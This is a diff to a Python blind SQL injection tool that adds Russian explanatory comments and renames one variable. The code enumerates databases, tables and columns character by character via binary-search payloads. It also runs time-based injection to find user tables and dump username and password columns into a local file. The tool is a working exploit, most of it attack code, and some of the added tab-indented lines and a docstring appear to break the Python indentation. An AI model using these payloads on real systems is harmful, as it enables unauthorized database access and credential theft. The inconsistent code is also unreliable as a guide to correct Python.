@@ -122,61 +122,74 @@ def get_all_databases(url): # (1)
 	db_numbers = half(url, db_nums_payload)
 	print("The total number of databases is: %d"% db_numbers)
 	for x in range(db_numbers):
-		db_len_payload = "select length(schema_name) from information_schema.schemata limit %d,1" % x
-		db_name_numbers = half(url, db_len_payload)
+		# Функция LENGTH используется для подсчета количества символов в строках.
+		db_len_payload = "select length(schema_name) from information_schema.schemata limit %d,1" % x 
+		db_name_numbers = half(url, db_len_payload) # получаем длину строк
 
 		db_name = ""
-		for y in range(1,db_name_numbers+1):
+		for y in range(1,db_name_numbers+1): 
+			# Для каждого символа сравниваем значение его ascii кода с кодами заданного нами диапазона
 		 	db_name_payload = "ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))" % (x,y)
+			# Переводим в строку
 		 	db_name += chr(half(url,db_name_payload))
 
 		print("The %d database is: %s"% (x+1, db_name))
 
 def get_db_all_tables(url,database):
-    tb_nums_payload = "select count(table_name) from information_schema.tables where table_schema = '%s'" % database
+    # считаем количество таблиц
+    tb_nums_payload = "select count(table_name) from information_schema.tables where table_schema = '%s'" % database 
     tb_numbers = half(url,tb_nums_payload)
     print("The number of tables in the %s database is: %d"% (database,tb_numbers))
 
     for x in range(tb_numbers):
+	# Функция LENGTH используется для подсчета количества символов в строках.
         tb_len_payload  = "select length(table_name) from information_schema.tables where table_schema = '%s' limit %d,1" % (database,x)
 
         tb_name_numbers = half(url,tb_len_payload)
         #print(tb_name_numbers)
         tb_name = ""
         for y in range(1,tb_name_numbers+1):
-
+	    # Для каждого символа сравниваем значение его ascii кода с кодами заданного нами диапазона
             tb_name_payload = "ascii(substr((select table_name from information_schema.tables where table_schema = '%s' limit %d,1),%d,1))" % (database,x,y)
             #print(tb_name_payload)
+	    # Переводим в строку
             tb_name += chr(half(url,tb_name_payload))
             #print(tb_name)
             print(database,"The %d table in the database is: %s"% (x+1,tb_name))
 
 def get_db_tb_all_columns(url,database,table):
+    # считаем клоичество столбцов
     co_nums_payload = "select count(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s'" % (database,table)
     co_numbers = half(url,co_nums_payload)
     print("The number of fields in the %s table in the %s database is: %d"% (database,table,co_numbers))
     for x in range(co_numbers):
+	# Функция LENGTH используется для подсчета количества символов в строках.
         co_len_payload  = "select length(column_name) from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1" % (database,table,x)
         co_name_numbers = half(url,co_len_payload)
 
         co_name = ""
         for y in range(1,co_name_numbers+1):
+	    # Для каждого символа сравниваем значение его ascii кода с кодами заданного нами диапазона
             co_name_payload = "ascii(substr((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1),%d,1))" % (database,table,x,y)
-            co_name += chr(half(url,co_name_payload))
+            # Переводим в строку
+	    co_name += chr(half(url,co_name_payload))
             print(database,"in the database",table,"the name of the %d field in the table: %s"% (x+1,co_name))
 """
 md5 используется для хеширования данных
 """
 def md5(str):
+    #  функция хеширования принимает только последовательность байтов в качестве параметра
     hl = hashlib.md5()
+    # Передать последовательность байтов можно также с помощью метода update(). В этом случае объект присоединяется к предыдущему значению
     hl.update(str)
+    # Получить зашифрованную последовательность байтов и строку позволяет hexdigest()
     return hl.hexdigest()
 """
-(1) Хэшируем result.content, который выводит содержимое запроса в байтах, 
+(*) Хэшируем result.content, который выводит содержимое запроса в байтах, 
 и получаем безопасный хеш(дайджест), возвращаемый, 
 как строковый объект двойной длины, содержащий только шестнадцатеричные цифры.
 """
-def half(url,payload):
+def half(url,payload): # Итеративный метод двоичного поиска
     low = 0
     high = 126
     standard_html = md5(http_get(url)) # (1)
@@ -195,33 +208,40 @@ def half(url,payload):
     return mid_num
 
 def dumpTime(url, TrackingId):
+    # создаем массив, в который входят payload
     queries = [
         "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()",
         "SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{}'",
         "SELECT CONCAT({},'::',{}) FROM {}"
     ]
-    value = 102
-    upperlimit = 176
-    lowerlimit = 31
-    operator = ">"
+    value = 102 # берем значение
+    upperlimit = 176 # определяем диапазон 
+    lowerlimit = 31 
+    operator = ">" # выбираем оператор
 
-    pattern = "Welcome back"
-    query = queries[0]
-    row = 0
-    charNum = 1
-    timeoutDelay = 10
-    timehascame = 0
-    count = 1
-    word = list()
+    pattern = "Welcome back" # pattern возвращаемый web-приложением 
+    query = queries[0] # задаем значение первого запроса 
+    row = 0 
+    charNum = 1 # число символoв в запросе с LIMIT
+    timeoutDelay = 10 # задержка по времени
+    timehascome = 0 
+    count = 1 
+    word = list() # создаем листы
     result = list()
     try:
-        r = requests.get(url, timeout=timeoutDelay, allow_redirects=False)
+        r = requests.get(url, timeout=timeoutDelay, allow_redirects=False) # делаем запрос
         if r.status_code != 200:
-            print(f"[-] An Error occured, HTTP (GET) response status: {r.status_code}")
+            print(f"[-] An Error occured, HTTP (GET) response status: {r.status_code}") # если страница выдает ошибку, то выводим сообщение
             exit(1)
-        filename = f"sqli-dumped-data_{parse.urlsplit(url)[1]}_.txt"
-        now = time.localtime()
-        start = time.time()
+        filename = f"sqli-dumped-data_{parse.urlsplit(url)[1]}_.txt" # создаем файл, вкоторый сохраним все скомпрометированные данные из таблицы
+        now = time.localtime() # фиксируем время 
+	"""
+	Функция time() модуля time вернет время в секундах с начала эпохи как число с плавающей запятой.
+        Конкретная дата эпохи и обработка високосных секунд зависит от платформы. В Windows и большинстве 
+        систем Unix периодом времени является 1 января 1970 года, 00:00:00 (UTC), 
+        и високосные секунды не учитываются во времени с начала эпохи. Это обычно называют временем Unix.
+	"""
+        start = time.time() 
         with open(filename, "w") as f:
             f.write(f"[i] Started in: {time.strftime('%Y/%m/%d %H:%M:%S', now)}\n-----------------------------------\n")
             print(f"[i] Log file created: {filename}")
@@ -282,7 +302,7 @@ def dumpTime(url, TrackingId):
                     if (value-31) <= 1:
                         result.append(''.join(word))
                         if result[len(result)-1] == '':
-                            timehascame += 1
+                            timehascome += 1
                             del result[-1]
                             result.append("\n")
                             if "\n\n" in ''.join(result):
@@ -295,17 +315,17 @@ def dumpTime(url, TrackingId):
                                     f.writelines(fileContent)
                                     print(f"[*] Dumped data written to: {filename}\n")
                             del result[-1]
-                            if timehascame == 1:
+                            if timehascome == 1:
                                 t = re.compile(".*users*.", re.IGNORECASE)
                                 table_name = list(filter(t.search, result))[0]
                                 query = queries[1].format(table_name)
-                            elif timehascame == 2:
+                            elif timehascome == 2:
                                 u = re.compile(".*username*.", re.IGNORECASE)
                                 p = re.compile(".*password*.", re.IGNORECASE)
                                 usernameColumn = list(filter(u.search, result))[0]
                                 passwordColumn = list(filter(p.search, result))[0]
                                 query = queries[2].format(usernameColumn, passwordColumn, table_name)
-                            elif timehascame == 3:
+                            elif timehascome == 3:
                                 now = time.localtime()
                                 end = time.time()
                                 print(f"[*] No more rows is being returned from current query!\n[*] No other query remained!")
